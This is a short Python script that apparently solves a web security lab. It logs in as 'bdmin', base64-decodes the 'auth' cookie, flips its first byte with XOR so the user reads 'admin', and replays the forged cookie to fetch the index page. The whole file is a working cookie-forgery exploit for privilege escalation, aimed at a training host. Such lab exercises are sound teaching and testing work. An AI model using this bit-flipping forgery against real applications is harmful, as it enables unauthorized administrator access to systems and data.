import requests
import base64

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

data = {
	'username' : 'bdmin',
	'password' : 'abcd'
}

loginurl = 'http://ptl-5c95dccb-4d6ae1cd.libcurl.so/login.php'
indexurl = 'http://ptl-5c95dccb-4d6ae1cd.libcurl.so/index.php'

session = requests.Session()
r = session.post(loginurl, data=data)

cookie = session.cookies['auth']
cookie = requests.utils.unquote(cookie)

decoded = bytearray(base64.b64decode(cookie))

# decoded[0] is in decimal and ord('a') is also in decimal so we can take xor

required_value = (decoded[0] ^ ord('b')) ^ ord('a')
decoded[0] = required_value

new_cookie = base64.b64encode(bytes(decoded))

session.cookies['auth'] = requests.utils.quote(new_cookie)

s = session.get(indexurl)
content = s.text

print(content)

